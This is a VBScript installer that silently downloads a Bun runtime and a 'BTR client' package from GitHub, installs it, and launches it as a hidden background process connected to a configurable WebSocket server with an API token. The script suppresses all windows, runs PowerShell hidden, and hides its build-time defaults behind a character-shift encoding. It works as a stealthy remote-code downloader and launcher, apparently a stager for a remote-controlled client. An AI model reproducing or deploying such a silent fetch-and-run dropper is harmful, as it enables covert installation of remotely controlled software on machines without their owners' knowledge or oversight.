' install_and_run_client.vbs
' Silently installs portable Bun, downloads the BTR client package and runs it.
' All output is written to a log file. No windows are shown.
'
' Usage: wscript install_and_run_client.vbs [WS_URL] [API_TOKEN]
'   WS_URL    - WebSocket server URL  (default: ws://127.0.0.1:8080)
'   API_TOKEN - Authentication token  (default: empty)

Option Explicit

' ============================================================
' Constants
' ============================================================
Const BUN_URL        = "https://github.com/oven-sh/bun/releases/latest/download/bun-windows-x64.zip"
Const REPO_ZIP_URL   = "https://github.com/2byte/btr/archive/refs/heads/main.zip"
' Path inside the extracted zip archive (btr-main = repoName-branch)
Const REPO_SUBFOLDER = "btr-main\backendServer\packages\client"

' ============================================================
' Paths
' ============================================================
Dim shell, fso
Set shell = CreateObject("WScript.Shell")
Set fso   = CreateObject("Scripting.FileSystemObject")

Dim homeDir, workDir, bunDir, bunExe, clientDir, logFile
homeDir   = shell.ExpandEnvironmentStrings("%USERPROFILE%")
workDir   = homeDir & "\.bun"
bunDir    = workDir & "\bin"
bunExe    = bunDir & "\bun.exe"
clientDir = workDir & "\btr-client"
logFile   = workDir & "\btr-client.log"

' ============================================================
' Build-time defaults (encoded with MorphShift shift=3)
' These values are injected by the build tool; empty string = no default
' ============================================================
Const DEFAULT_WS_URL      = "@@WS_URL@@"
Const DEFAULT_API_TOKEN   = "@@API_TOKEN@@"
Const DEFAULT_CLIENT_NAME = "@@CLIENT_NAME@@"

' ============================================================
' Optional arguments (override build-time defaults)
' ============================================================
Dim wsUrl, apiToken, clientName
wsUrl      = DEFAULT_WS_URL
apiToken   = DEFAULT_API_TOKEN
clientName = DEFAULT_CLIENT_NAME
If WScript.Arguments.Count >= 1 Then wsUrl      = WScript.Arguments(0)
If WScript.Arguments.Count >= 2 Then apiToken   = WScript.Arguments(1)
If WScript.Arguments.Count >= 3 Then clientName = WScript.Arguments(2)

' ============================================================
' Bootstrap: create directories before first log write
' ============================================================
RunCmd "cmd.exe /c md """ & bunDir   & """ 2>nul"
RunCmd "cmd.exe /c md """ & clientDir & """ 2>nul"

' ============================================================
' Main
' ============================================================
AppendLog "========================================"
AppendLog "BTR client installer started"
AppendLog "========================================"

' --- 1. Install Bun if missing ---
If Not fso.FileExists(bunExe) Then
    AppendLog "Bun not found - downloading..."

    Dim bunZip, bunExtract
    bunZip     = workDir & "\bun-windows-x64.zip"
    bunExtract = workDir & "\bun-extract"

    PsDownload BUN_URL, bunZip
    If Not fso.FileExists(bunZip) Then
        AppendLog "ERROR: failed to download Bun zip"
        Cleanup bunZip, bunExtract
        WScript.Quit 1
    End If

    PsExpand bunZip, bunExtract
    WScript.Sleep 1000

    Dim extractedExe
    extractedExe = bunExtract & "\bun-windows-x64\bun.exe"
    If Not fso.FileExists(extractedExe) Then
        AppendLog "ERROR: bun.exe not found after extraction"
        Cleanup bunZip, bunExtract
        WScript.Quit 1
    End If

    RunCmd "cmd.exe /c move /Y """ & extractedExe & """ """ & bunExe & """ >nul 2>&1"
    Cleanup bunZip, bunExtract
    AppendLog "Bun installed: " & bunExe
Else
    AppendLog "Bun already present: " & bunExe
End If

' --- 2. Download client package ---
AppendLog "Downloading client package from GitHub..."

Dim repoZip, repoExtract
repoZip     = workDir & "\btr-main.zip"
repoExtract = workDir & "\btr-extract"

PsDownload REPO_ZIP_URL, repoZip
If Not fso.FileExists(repoZip) Then
    AppendLog "ERROR: failed to download repo zip"
    Cleanup repoZip, repoExtract
    WScript.Quit 1
End If

PsExpand repoZip, repoExtract
WScript.Sleep 1000

Dim srcClient
srcClient = repoExtract & "\" & REPO_SUBFOLDER
If Not fso.FolderExists(srcClient) Then
    AppendLog "ERROR: client folder not found in zip at: " & srcClient
    Cleanup repoZip, repoExtract
    WScript.Quit 1
End If

' Replace old client dir
If fso.FolderExists(clientDir) Then
    RunCmd "cmd.exe /c rd /s /q """ & clientDir & """"
    WScript.Sleep 500
End If

PsMoveFolder srcClient, clientDir
Cleanup repoZip, repoExtract
AppendLog "Client package ready: " & clientDir

' --- 3. bun install ---
AppendLog "Running bun install..."
Dim installCmd
installCmd = "cmd.exe /c cd /d """ & clientDir & """ && """ & bunExe & """ install >> """ & logFile & """ 2>&1"
RunCmd installCmd
AppendLog "bun install done"

' --- 4. Launch client (background, hidden) ---
AppendLog "Launching client.ts..."

Dim envPart, launchCmd
envPart = ""
If Len(wsUrl)      > 0 Then envPart = envPart & "set ""WS_URL="      & wsUrl      & """ && "
If Len(apiToken)   > 0 Then envPart = envPart & "set ""API_TOKEN="   & apiToken   & """ && "
If Len(clientName) > 0 Then envPart = envPart & "set ""CLIENT_NAME=" & clientName & """ && "

launchCmd = "cmd.exe /c cd /d """ & clientDir & """ && " & envPart & _
            """" & bunExe & """ run src\client.ts >> """ & logFile & """ 2>&1"

' Run hidden, do NOT wait (False) so VBS exits immediately
shell.Run launchCmd, 0, False
AppendLog "Client process launched"

Set shell = Nothing
Set fso   = Nothing

' ============================================================
' Helpers
' ============================================================

' Run a command hidden and wait for it to complete
Sub RunCmd(cmd)
    shell.Run cmd, 0, True
End Sub

' Download a URL to a local path via PowerShell (handles HTTPS redirects)
Sub PsDownload(url, dest)
    Dim psCmd
    psCmd = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Command " & _
            """Invoke-WebRequest -Uri '" & url & "' -OutFile '" & dest & _
            "' -UseBasicParsing -TimeoutSec 120"""
    shell.Run psCmd, 0, True
End Sub

' Expand a zip archive to a destination via PowerShell
Sub PsExpand(zipPath, destPath)
    Dim psCmd
    psCmd = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Command " & _
            """Expand-Archive -Path '" & zipPath & "' -DestinationPath '" & destPath & "' -Force"""
    shell.Run psCmd, 0, True
End Sub

' Move a folder via PowerShell Move-Item (works across subdirs reliably)
Sub PsMoveFolder(src, dest)
    Dim psCmd
    psCmd = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Command " & _
            """Move-Item -Path '" & src & "' -Destination '" & dest & "' -Force"""
    shell.Run psCmd, 0, True
End Sub

' Remove a file and/or folder silently
Sub Cleanup(zipPath, extractDir)
    If fso.FileExists(zipPath)    Then fso.DeleteFile   zipPath,    True
    If fso.FolderExists(extractDir) Then fso.DeleteFolder extractDir, True
End Sub

' Append a timestamped line to the log file
Sub AppendLog(msg)
    Dim f
    Set f = fso.OpenTextFile(logFile, 8, True) ' 8 = ForAppending, True = create if absent
    f.WriteLine "[" & Now & "] " & msg
    f.Close
    Set f = Nothing
End Sub
